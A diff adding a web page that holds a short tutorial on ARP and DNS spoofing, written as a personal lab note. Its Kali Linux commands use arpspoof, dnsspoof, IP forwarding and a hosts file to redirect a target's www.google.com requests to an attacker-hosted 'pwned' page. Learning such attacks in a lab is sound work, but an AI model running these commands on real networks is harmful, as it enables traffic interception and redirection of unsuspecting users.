@@ -1,0 +1,102 @@
+<!doctype html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>ARP and DNS Spoofing</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.6.3/css/all.css" integrity="sha384-UHRtZLI+pbxtHCWp1t77Bi1L4ZtiqrqD80Kn4Z8NTSRyMA2Fd33n5dQ8lWUE00s/" crossorigin="anonymous">
+<link rel="stylesheet" href="assets/css/site.css">
+</head>
+<body>
+	<header class="header">
+	<h1>Spyderops Designs</h1>
+		<h2>A fully responsive site using CSS Grid</h2>
+	</header>
+	<div class="topnav" id="topBar">
+	<a href="index.html" class="active"><i class="fas fa-home"></i> Home</a>
+		<a href="#" class="news"><i class="fas fa-newspaper"></i> News</a>
+		<a href="#" class="contact"><i class="fas fa-envelope-square"></i> Contact</a>
+		<a href="#" class="about"><i class="fas fa-user"></i> About</a>
+				<div class="search-container">
+				<input type="text" placeholder="Search..">
+				<button type="submit">Go</button>
+				<a href="javascript:void(0);" class="icon" onClick="hamburger()">More</a>
+				</div><!-- search-container -->
+	</div><!-- topnav -->
+	<!-- main finishes just above the footer - way on down there :) -->
+	<main class=".grid-container .single-page-gc">
+
+	<section class="post">
+		<div class="card">
+		<!-- post item -->
+				<div class="single-page-post-item">
+				  <div>
+                    <h1 id="top">ARP and DNS Spoofing</h1>
+                    <div class="thumbnail single-page-tn"><img class="left" src="assets/images/gringo-sm.jpg"/></div>
+                    <div class="separator"></div>
+                    <p>The basic principle behind ARP spoofing is to exploit the lack of authentication in the ARP protocol by sending&nbsp;<a title="Spoofing attack" href="https://en.wikipedia.org/wiki/Spoofing_attack">spoofed</a>&nbsp;ARP messages onto the LAN (Local Area Network).</p>
+                    <p>Gringo, the chameleon above is doing his best to sniff your traffic as he hangs on a branch. You would hardly notice he was even there. That is of course if he wasn't so darn handsome.</p>
+                    <p>Anyway, I digress,&nbsp; ARP spoofing attacks can be run from a compromised host on the LAN, or from an attacker's machine that is connected directly to the target LAN.</p>
+                    <h2>What is the goal?</h2>
+                    <p>Generally, the goal of the attack is to associate the attacker's host&nbsp;<a title="MAC address" href="https://en.wikipedia.org/wiki/MAC_address">MAC address</a>&nbsp;with the&nbsp;<a title="IP address" href="https://en.wikipedia.org/wiki/IP_address">IP address</a>&nbsp;of a target&nbsp;<a title="Host (network)" href="https://en.wikipedia.org/wiki/Host_(network)">host</a>, so that any traffic meant for the target host will be sent to the attacker's host. The attacker may choose to inspect the packets (spying). Forwarding the traffic to the actual default destination to avoid discovery. After this the attacker can modify the data before forwarding it (<a title="Man-in-the-middle attack" href="https://en.wikipedia.org/wiki/Man-in-the-middle_attack">man-in-the-middle attack</a>), or launch a&nbsp;<a title="Denial-of-service attack" href="https://en.wikipedia.org/wiki/Denial-of-service_attack">denial-of-service attack</a>&nbsp;by causing some or all of the packets on the network to be dropped.</p>
+                    <p><a href="https://en.wikipedia.org/wiki/ARP_spoofing">https://en.wikipedia.org/wiki/ARP_spoofing</a></p>
+                    <p>Below is a topology that represents these concepts. I am eliminating the recon phase of pentesting and just hiding in the Ether. Below the image you will find the configuration. The HTML page you craft is up to you. As an example, when the TARGET asks for www.google.com, they will get your pwned page that you made instead.</p>
+                    <p><img class="alignnone wp-image-479 size-full" src="assets/images/arp-spoof.png" alt="arp spoof topology"></p>
+                    <h4>Here's the code</h4>
+                    <code>
+                    kali~# vi hosts.txt
+                    10.0.0.2 www.google.com
+                    :wq
+                    </code></:wq>
+                    <pre>
+                    kali~# mv /var/www/html/index.html /var/www/html/index.BKP
+                    kali~# vi /var/www/html/index.html (make your own pwned page)
+                    kali~# echo 1 &gt; /proc/sys/net/ipv4/ip_forward
+                    kali~# arpspoof -i eth0 -t 10.0.0.1 10.0.0.6
+                    kali~# arpspoof -i eth0 -t 10.0.0.6 10.0.0.1
+                    kali~# dnsspoof -i eth0 -f /root/hosts.txt
+                    kali~# service apache2 start
+                    </pre>
+                    <p>This is not too bad. I only include it for proof of concept and to have a place to come back to if I forget how to do it.</p>
+
+				  </div>
+				</div>
+		<!-- post item -->
+		</div><!-- card -->
+		<hr>
+	</main><!-- see, told you ! -->
+	<footer class="footer">
+	<h4>Let me Design for you <a href="mailto:"brnagn7@gmail.com"><i class="fa fa-envelope"></i></a></h4>
+			<div class="flip">
+					<div class="front" style="background-image: url(assets/images/html5.jpg?w=1260&h=750&dpr=2&auto=compress&cs=tinysrgb)">
+						 <h1 class="text-shadow">CODE</h1>
+					</div>
+					<div class="back">
+						 <h2>HTML5</h2>
+						 <p>Brings new elements, attributes, and behaviors, and a larger set of technologies that allows the building of more diverse and powerful Web sites and applications.</p>
+					</div>
+			</div>
+			<div class="flip">
+					<div class="front" style="background-image: url(assets/images/css3.jpg?w=1260&h=750&dpr=2&auto=compress&cs=tinysrgb)">
+						 <h1 class="text-shadow">CSS</h1>
+					</div>
+					<div class="back">
+						 <h2>CSS3</h2>
+						 <p>CSS3 brings a lot of long-awaited novelties, like rounded corners, shadows, gradients, transitions or animations, as well as new layouts like multi-columns, flexible box or grid layouts.</p>
+					</div>
+			</div>
+			<div class="flip">
+					<div class="front" style="background-image: url(assets/images/js.jpg?w=1260&h=750&dpr=2&auto=compress&cs=tinysrgb)">
+						 <h1 class="text-shadow">CODE</h1>
+					</div>
+					<div class="back">
+						 <h2>Javascript</h2>
+						 <p>When a user requests an HTML page with JavaScript in it, the script is sent to the browser and it's up to the browser to do something with it.</p>
+					</div>
+			</div>
+			
+	</footer>
+	<!-- good practice to put your JS down here -->
+	<script src="assets/js/functions.js"></script>
+</body>
+</html>
